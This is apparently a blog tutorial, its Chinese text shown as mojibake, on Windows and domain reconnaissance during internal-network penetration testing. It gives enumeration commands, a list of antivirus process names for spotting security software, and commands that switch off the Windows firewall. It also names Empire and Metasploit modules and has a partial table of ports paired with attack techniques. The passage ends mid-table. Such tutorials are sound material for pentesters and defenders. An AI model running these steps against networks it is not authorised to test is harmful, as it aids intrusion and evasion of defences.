<h2 id="æŸ¥è¯¢å·²å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ä¿¡æ¯"><a href="#æŸ¥è¯¢å·²å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢å·²å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ä¿¡æ¯"></a>æŸ¥è¯¢å·²å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ä¿¡æ¯</h2><ul>
<li>wmic product get name,version</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505085612101.png" alt="image-20200505085612101"></p>
<p>æ³¨ï¼šæœ‰çš„ç³»ç»Ÿä¸å¯ç”¨ï¼Œæˆ‘åœ¨win10ä¸Šç”¨wmic /?ï¼Œä»¥å¼ƒç”¨ï¼Œåˆ«äººè¯´åœ¨win2012R2,win7å¯ä»¥ç”¨</p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505090205953.png" alt="image-20200505090205953" style="zoom:150%;">

<h3 id="powershellæ›¿ä»£å‘½ä»¤"><a href="#powershellæ›¿ä»£å‘½ä»¤" class="headerlink" title="powershellæ›¿ä»£å‘½ä»¤"></a>powershellæ›¿ä»£å‘½ä»¤</h3><ul>
<li>Get-WmiObject -class win32_product | Select-Object  -property name ,version</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505090514148.png" alt="image-20200505090514148"></p>
<h2 id="æŸ¥è¯¢æœ¬æœºæœåŠ¡"><a href="#æŸ¥è¯¢æœ¬æœºæœåŠ¡" class="headerlink" title="æŸ¥è¯¢æœ¬æœºæœåŠ¡"></a>æŸ¥è¯¢æœ¬æœºæœåŠ¡</h2><ul>
<li>wmic service list brief</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091145138.png" alt="image-20200505091145138"></p>
<h2 id="æŸ¥è¯¢è¿›ç¨‹"><a href="#æŸ¥è¯¢è¿›ç¨‹" class="headerlink" title="æŸ¥è¯¢è¿›ç¨‹"></a>æŸ¥è¯¢è¿›ç¨‹</h2><ul>
<li>talklist</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091242672.png" alt="image-20200505091242672" style="zoom:200%;">

<ul>
<li>wmic process list brief</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091342931.png" alt="image-20200505091342931"></p>
<ul>
<li>qprocess *</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505140059112.png" alt="image-20200505140059112" style="zoom:200%;">

<blockquote>
<ul>
<li>å¸¸è§çš„æ€è½¯è¿›ç¨‹ï¼š</li>
</ul>
<table>
<thead>
<tr>
<th>è¿›ç¨‹å</th>
<th>è½¯ä»¶</th>
</tr>
</thead>
<tbody><tr>
<td>360sd.exe</td>
<td>360æ€æ¯’</td>
</tr>
<tr>
<td>360tray.exe</td>
<td>360å®æ—¶ä¿æŠ¤</td>
</tr>
<tr>
<td>ZhuDongFangYu.exe</td>
<td>360ä¸»åŠ¨é˜²å¾¡</td>
</tr>
<tr>
<td>KSafeTray.exe</td>
<td>é‡‘å±±å«å£«</td>
</tr>
<tr>
<td>SafeDogUpdateCenter.exe</td>
<td>å®‰å…¨ç‹—</td>
</tr>
<tr>
<td>McAfee McShield.exe</td>
<td>McAfee</td>
</tr>
<tr>
<td>egui.exe</td>
<td>NOD32</td>
</tr>
<tr>
<td>AVP.exe</td>
<td>å¡å·´æ–¯åŸº</td>
</tr>
<tr>
<td>avguard.exe</td>
<td>å°çº¢ä¼</td>
</tr>
<tr>
<td>bdagent.exe</td>
<td>BitDefender</td>
</tr>
</tbody></table>
</blockquote>
<p>è·å–è½¯ä»¶å®‰è£…è·¯å¾„</p>
<ul>
<li>wmic process where(description=â€mysqld.exeâ€)&gt;&gt;mysql.log</li>
</ul>
<h2 id="æŸ¥çœ‹å·²å¯åŠ¨çš„ç¨‹åºä¿¡æ¯"><a href="#æŸ¥çœ‹å·²å¯åŠ¨çš„ç¨‹åºä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹å·²å¯åŠ¨çš„ç¨‹åºä¿¡æ¯"></a>æŸ¥çœ‹å·²å¯åŠ¨çš„ç¨‹åºä¿¡æ¯</h2><ul>
<li>wmic startup get command.caption</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091604430.png" alt="image-20200505091604430"></p>
<h2 id="æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h2><ul>
<li>schtasks /query /fo LIST /v</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505091811443.png" alt="image-20200505091811443"></p>
<p>æ³¨ï¼šæœ‰çš„ç‰ˆæœ¬å¯èƒ½çœ‹ä¸äº†ï¼Œ</p>
<blockquote>
<p>æ­¤å¤„åœ¨æˆ‘çš„é¶æœºServer2008R2ä¸­å‡ºç°äº†é”™è¯¯ï¼šæ— æ³•åŠ è½½åˆ—èµ„æºï¼Œè¿™é‡ŒæŠŠç¼–ç æš‚æ—¶è®¾ç½®ä¸ºè‹±æ–‡ï¼š<code>chcp 437</code>ï¼Œä¹‹åå†æ”¹å›æ¥ï¼š<code>chcp 936</code>å³å¯</p>
</blockquote>
<h2 id="æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"><a href="#æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´" class="headerlink" title="æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"></a>æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</h2><ul>
<li>net statistics workstation</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092016966.png" alt="image-20200505092016966"></p>
<h2 id="æŸ¥çœ‹ç™»å½•åˆ°è¿™å°æœåŠ¡å™¨çš„è®¡ç®—æœº"><a href="#æŸ¥çœ‹ç™»å½•åˆ°è¿™å°æœåŠ¡å™¨çš„è®¡ç®—æœº" class="headerlink" title="æŸ¥çœ‹ç™»å½•åˆ°è¿™å°æœåŠ¡å™¨çš„è®¡ç®—æœº"></a>æŸ¥çœ‹ç™»å½•åˆ°è¿™å°æœåŠ¡å™¨çš„è®¡ç®—æœº</h2><ul>
<li>echo %logonserver%</li>
</ul>
<h2 id="æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"><a href="#æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨"></a>æŸ¥çœ‹ç”¨æˆ·åˆ—è¡¨</h2><p>ä¸ net user /domain ä¸åŒ</p>
<ul>
<li>net user</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092113646.png" alt="image-20200505092113646" style="zoom:150%;">

<h2 id="æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯"><a href="#æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯"></a>æŸ¥çœ‹æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯</h2><ul>
<li>net localgroup administrators</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092259302.png" alt="image-20200505092259302" style="zoom:150%;">

<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092350422.png" alt="image-20200505092350422"></p>
<h2 id="æŸ¥çœ‹å½“å‰åœ¨çº¿çš„ç”¨æˆ·"><a href="#æŸ¥çœ‹å½“å‰åœ¨çº¿çš„ç”¨æˆ·" class="headerlink" title="æŸ¥çœ‹å½“å‰åœ¨çº¿çš„ç”¨æˆ·"></a>æŸ¥çœ‹å½“å‰åœ¨çº¿çš„ç”¨æˆ·</h2><ul>
<li>query user || qwinsta</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092520293.png" alt="image-20200505092520293" style="zoom:150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092531518.png" alt="image-20200505092531518" style="zoom:150%;">

<h2 id="æŸ¥çœ‹æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯"><a href="#æŸ¥çœ‹æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯" class="headerlink" title="æŸ¥çœ‹æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯"></a>æŸ¥çœ‹æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯</h2><ul>
<li>net session</li>
</ul>
<blockquote>
<p>å¯¹äºè¯¥æŒ‡ä»¤ï¼Œä¸€å¼€å§‹æˆ‘çš„æœºå™¨ä¸ŠæŠ¥é”™ï¼šâ€å‘ç”Ÿç³»ç»Ÿé”™è¯¯5ã€‚æ‹’ç»è®¿é—®â€ï¼Œæ‰¾äº†ä¸€ä¸‹è§£å†³åŠæ³•ï¼Œåªè¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œå³å¯ï¼Œæ­¤å¤„é¶æœºæ²¡æœ‰å›è¯ï¼Œæ‰€ä»¥æ˜¾ç¤ºä¸ºç©º<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200423113727-c09d0fcc-8513-1.png" target="_blank" rel="noopener"><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423113727-c09d0fcc-8513-1.png" alt="img"></a></p>
</blockquote>
<h2 id="æŸ¥çœ‹ç«¯å£"><a href="#æŸ¥çœ‹ç«¯å£" class="headerlink" title="æŸ¥çœ‹ç«¯å£"></a>æŸ¥çœ‹ç«¯å£</h2><ul>
<li>netstat -ano</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093135040.png" alt="image-20200505093135040" style="zoom:150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505092829887.png" alt="image-20200505092829887" style="zoom:150%;">

<h2 id="æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯"><a href="#æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯"></a>æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</h2><ul>
<li>systeminfoå¯ä»¥</li>
<li>wmic qfe get caption,description,hotfixid,installedon</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093006349.png" alt="image-20200505093006349" style="zoom:150%;">

<h2 id="æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨"><a href="#æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨"></a>æŸ¥çœ‹æœ¬æœºå…±äº«åˆ—è¡¨</h2><ul>
<li>net share</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093339613.png" alt="image-20200505093339613" style="zoom:150%;">

<ul>
<li>wmic share get name,path.status</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093452485.png" alt="image-20200505093452485" style="zoom: 200%;">

<h2 id="æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨çš„ARPç¼“å­˜è¡¨"><a href="#æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨çš„ARPç¼“å­˜è¡¨" class="headerlink" title="æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨çš„ARPç¼“å­˜è¡¨"></a>æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨çš„ARPç¼“å­˜è¡¨</h2><ul>
<li>route print</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093557840.png" alt="image-20200505093557840" style="zoom:150%;">

<ul>
<li>arp -a</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093713636.png" alt="image-20200505093713636" style="zoom:200%;">

<h2 id="æŸ¥çœ‹é˜²ç«å¢™é…ç½®"><a href="#æŸ¥çœ‹é˜²ç«å¢™é…ç½®" class="headerlink" title="æŸ¥çœ‹é˜²ç«å¢™é…ç½®"></a>æŸ¥çœ‹é˜²ç«å¢™é…ç½®</h2><ul>
<li>netsh firewall show config</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505093915889.png" alt="image-20200505093915889" style="zoom:150%;">

<h2 id="å…³é—­é˜²ç«å¢™"><a href="#å…³é—­é˜²ç«å¢™" class="headerlink" title="å…³é—­é˜²ç«å¢™"></a>å…³é—­é˜²ç«å¢™</h2><ul>
<li>win2003å‰ï¼šnetsh firewall set opmode disable</li>
<li>win2003åï¼šnetsh advfirewall set allprofiles state off</li>
</ul>
<blockquote>
<p>ä¸€èˆ¬æ¥è¯´ä¸è¦æ“ä½œé˜²ç«å¢™çš„å¼€å…³ï¼Œé£é™©æå¤§ï¼Œåªéœ€è¦æŸ¥çœ‹é…ç½®å³å¯</p>
</blockquote>
<h2 id="æŸ¥çœ‹ä»£ç†"><a href="#æŸ¥çœ‹ä»£ç†" class="headerlink" title="æŸ¥çœ‹ä»£ç†"></a>æŸ¥çœ‹ä»£ç†</h2><ul>
<li>reg query â€œHKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settingsâ€</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505094325659.png" alt="image-20200505094325659" style="zoom:150%;">

<h2 id="æŸ¥è¯¢è¿œç¨‹è¿æ¥æœåŠ¡"><a href="#æŸ¥è¯¢è¿œç¨‹è¿æ¥æœåŠ¡" class="headerlink" title="æŸ¥è¯¢è¿œç¨‹è¿æ¥æœåŠ¡"></a>æŸ¥è¯¢è¿œç¨‹è¿æ¥æœåŠ¡</h2><ul>
<li>reg query â€œHKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\Terminal Server\WinStations\RDP-Tcpâ€ /v PortNumber</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505094659459.png" alt="image-20200505094659459"></p>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505094735891.png" alt="image-20200505094735891"></p>
<blockquote>
<p>è¿æ¥ç«¯å£ä¸º16è¿›åˆ¶æ•°0xd3dï¼Œè½¬æ¢ä¸º10è¿›åˆ¶å°±æ˜¯3389</p>
</blockquote>
<blockquote>
<h3 id="ä½¿ç”¨empireæ”¶é›†ä¿¡æ¯"><a href="#ä½¿ç”¨empireæ”¶é›†ä¿¡æ¯" class="headerlink" title="ä½¿ç”¨empireæ”¶é›†ä¿¡æ¯"></a>ä½¿ç”¨empireæ”¶é›†ä¿¡æ¯</h3><p>åœ¨æ”»å‡»æœºä¸Šå®‰è£…empireåï¼Œä½¿ç”¨<code>usemodule powershell/situational_awareness/host/winenum</code>å³å¯æ”¶é›†ç›¸å…³ä¿¡æ¯ï¼Œæ³¨æ„ä½¿ç”¨è¯¥æ¨¡å—éœ€è¦æ‹¿åˆ°ç®¡ç†å‘˜æƒé™</p>
</blockquote>
<h2 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h2><h3 id="æŸ¥çœ‹å½“å‰æƒé™"><a href="#æŸ¥çœ‹å½“å‰æƒé™" class="headerlink" title="æŸ¥çœ‹å½“å‰æƒé™"></a>æŸ¥çœ‹å½“å‰æƒé™</h3><ul>
<li>whoami</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095057090.png" alt="image-20200505095057090" style="zoom: 200%;">

<h3 id="è·å–åŸŸid"><a href="#è·å–åŸŸid" class="headerlink" title="è·å–åŸŸid"></a>è·å–åŸŸid</h3><ul>
<li>whoami /all</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095151881.png" alt="image-20200505095151881"></p>
<h2 id="è·å–æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯"><a href="#è·å–æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯" class="headerlink" title="è·å–æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯"></a>è·å–æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</h2><ul>
<li>net user xxx /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095317773.png" alt="image-20200505095317773" style="zoom: 150%;">

<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095421848.png" alt="image-20200505095421848" style="zoom:150%;">

<h2 id="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h2><ul>
<li>ipconfig /all</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095542250.png" alt="image-20200505095542250" style="zoom:150%;">

<ul>
<li>ç”¨nslookupè§£æåŸŸåçš„ip,æ¥åˆ¤æ–­dnsæœåŠ¡å™¨ä¸åŸŸæ§æ˜¯å¦åœ¨åŒä¸€ä¸»æœºä¸Š</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505095809931.png" alt="image-20200505095809931" style="zoom:150%;">

<h2 id="æŸ¥è¯¢å½“å‰ç™»å½•åŸŸä¸ç”¨æˆ·ä¿¡æ¯"><a href="#æŸ¥è¯¢å½“å‰ç™»å½•åŸŸä¸ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="æŸ¥è¯¢å½“å‰ç™»å½•åŸŸä¸ç”¨æˆ·ä¿¡æ¯"></a>æŸ¥è¯¢å½“å‰ç™»å½•åŸŸä¸ç”¨æˆ·ä¿¡æ¯</h2><ul>
<li>net config workstation</li>
</ul>
<p>de1taé¶æœºæœªæˆåŠŸï¼Œ<a href="https://xz.aliyun.com/t/7663" target="_blank" rel="noopener">ç”¨çš„å…ˆçŸ¥çš„å›¾</a></p>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/20200423114108-44acd9b4-8514-1.png" alt="img" style="zoom:150%;">

<h2 id="åˆ¤æ–­ä¸»åŸŸ"><a href="#åˆ¤æ–­ä¸»åŸŸ" class="headerlink" title="åˆ¤æ–­ä¸»åŸŸ"></a>åˆ¤æ–­ä¸»åŸŸ</h2><ul>
<li>net time /domain</li>
</ul>
<img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505100133137.png" alt="image-20200505100133137" style="zoom:200%;">

<blockquote>
<p>è‹¥æ˜¯æ­¤å‘½ä»¤åœ¨æ˜¾ç¤ºåŸŸå¤„æ˜¾ç¤ºWORKGROUPï¼Œåˆ™ä¸å­˜åœ¨åŸŸï¼Œè‹¥æ˜¯æŠ¥é”™ï¼šå‘ç”Ÿç³»ç»Ÿé”™è¯¯5ï¼Œåˆ™å­˜åœ¨åŸŸï¼Œä½†è¯¥ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·</p>
</blockquote>
<h2 id="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h2><p>icmp</p>
<ul>
<li>for /L %I in (1,1,20) DO @ping -w 1 -n 1 192.168.0.%I | findstr â€œTTL=â€</li>
<li>for /l %i in (1,1,255) do @ ping 192.168.0.%i -w 1 -n 1 | find /i â€œttl=â€</li>
</ul>
<p><img src="/2020/05/05/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20200505100619516.png" alt="image-20200505100619516"></p>
<blockquote>
<p>åˆ©ç”¨empireä¸­çš„arpscanæ¨¡å—ï¼š<code>usemodule situational_awareness/network/arpscan</code>ï¼Œè®¾ç½®Range(èŒƒå›´)åå³å¯æ‰«æ</p>
</blockquote>
<h2 id="æ‰«æç«¯å£"><a href="#æ‰«æç«¯å£" class="headerlink" title="æ‰«æç«¯å£"></a>æ‰«æç«¯å£</h2><blockquote>
<ul>
<li>ä½¿ç”¨telnetè¿›è¡Œæ‰«æï¼š<code>telnet ä¸»æœºå 22</code></li>
<li>ä½¿ç”¨metasploitè¿›è¡Œæ‰«æï¼š<code>éœ€è¦ç”¨åˆ°çš„æ˜¯auxiliar/scanner/portscan/ackã€ftpbounceã€synã€tcpã€xmas</code>ç­‰æ¨¡å—</li>
<li>PowerSploitä¸­çš„Invoke-Portscan.ps1è„šæœ¬ï¼Œä½äºReconç›®å½•ä¸‹</li>
<li>ä½¿ç”¨Nishangçš„PortScanæ¨¡å—ï¼Œä½äºscanç›®å½•ä¸‹ï¼Œä¸Šä¼ åˆ°ä¸»æœºä¸Šæ‰§è¡Œ</li>
</ul>
</blockquote>
<h2 id="è·å–banner"><a href="#è·å–banner" class="headerlink" title="è·å–banner"></a>è·å–banner</h2><blockquote>
<p>æ‰«æåˆ°ç«¯å£åå°±è¦è·å–åˆ°å…¶Bannerä¿¡æ¯ï¼Œæ¥ç€å°±å¯ä»¥åœ¨æ¼æ´åº“é‡ŒæŸ¥æ‰¾pocï¼Œè¿™ä¸ªå¯ä»¥æ‰¾ä¸€ä¸‹å¸¸è§çš„ç«¯å£çš„æœåŠ¡æ¥å¾—çŸ¥</p>
<table>
<thead>
<tr>
<th>ç«¯å£å·</th>
<th>ç«¯å£è¯´æ˜</th>
<th>æ”»å‡»æŠ€å·§</th>
</tr>
</thead>
<tbody><tr>
<td>21/22/69</td>
<td>ftp/tftpï¼šæ–‡ä»¶ä¼ è¾“åè®®</td>
<td>å…è®¸åŒ¿åä¸Šä¼ ã€ä¸‹è½½ã€çˆ†ç ´ã€å—…æ¢ã€æº¢å‡ºå’Œåé—¨</td>
</tr>
<tr>
<td>22</td>
<td>sshï¼šè¿œç¨‹è¿æ¥</td>
<td>çˆ†ç ´OpenSSHï¼›28ä¸ªé€€æ ¼</td>
</tr>
<tr>
<td>23</td>
<td>telnetï¼šè¿œç¨‹è¿æ¥</td>
<td>çˆ†ç ´\å—…æ¢ã€å¼±å£ä»¤</td>
</tr>
<tr>
<td>25</td>
<td>smtpï¼šé‚®ä»¶æœåŠ¡</td>
<td>é‚®ä»¶ä¼ªé€ </td>
</tr>
<tr>
<td>53</td>
<td>DNSï¼šåŸŸåç³»ç»Ÿ</td>
<td>DNSåŒºåŸŸä¼ è¾“\DNSåŠ«æŒ\DNSç¼“å­˜æŠ•æ¯’\DNSæ¬ºéª—\åˆ©ç”¨DNSéš§é“æŠ€æœ¯åˆºé€é˜²ç«å¢™</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp</td>
<td>åŠ«æŒ\æ¬ºéª—</td>
</tr>
<tr>
<td>80/443/8080</td>
<td>å¸¸è§webæœåŠ¡ç«¯å£</td>
<td>webæ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>çˆ†ç ´ã€å—…æ¢</td>
</tr>
<tr>
<td>139</td>
<td>samba</td>
<td>çˆ†ç ´\æœªæˆæƒè®¿é—®\è¿œç¨‹ä»£ç æ‰§è¡Œ</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>çˆ†ç ´</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>çˆ†ç ´</td>
</tr>
<tr>
<td>389</td>
<td>ldapç›®å½•è®¿é—®åè®®</td>
<td>æ³¨å…¥æ”»å‡»\æœªæˆæƒè®¿é—®ï¼Œå¼±å£ä»¤</td>
</tr>
<tr>
<td>512/513/514</td>
<td>linux rexec</td>
<td>ç›´æ¥ä½¿ç”¨rlogin\çˆ†ç ´</td>
</tr>
<tr>
<td>873</td>
<td>rsync</td>
<td>æœªæˆæƒè®¿é—®\æ–‡ä»¶ä¸Šä¼ </td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>çˆ†ç ´ï¼šè¿›è¡Œå†…ç½‘æ¸—é€</td>
</tr>
<tr>
<td>1352</td>
<td>lotus Dominoé‚®ä»¶æœåŠ¡</td>
<td>çˆ†ç ´ï¼šå¼±å£ä»¤\ä¿¡æ¯æ³„æ¼ï¼šæºä»£ç </td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>çˆ†ç ´ï¼šä½¿ç”¨ç³»ç»Ÿç”¨æˆ·ç™»å½•\æ³¨å…¥æ”»å‡»\SAå¼±å£ä»¤</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>çˆ†ç ´ï¼šTNS\æ³¨å…¥æ”»å‡»\åå¼¹shell</td>
</tr>
<tr>
<td>2049</td>
<td>nfs</td>
<td>é…ç½®ä¸å½“</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td>æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>çˆ†ç ´\æ‹’ç»æœåŠ¡\æ³¨å…¥\ææƒ</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>çˆ†ç ´\Shiftåé—¨</td>
</tr>
<tr>
<td>3690</td>
<td>SVNæœåŠ¡</td>
<td>SVNæ³„éœ²\æœªæˆæƒè®¿é—®</td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
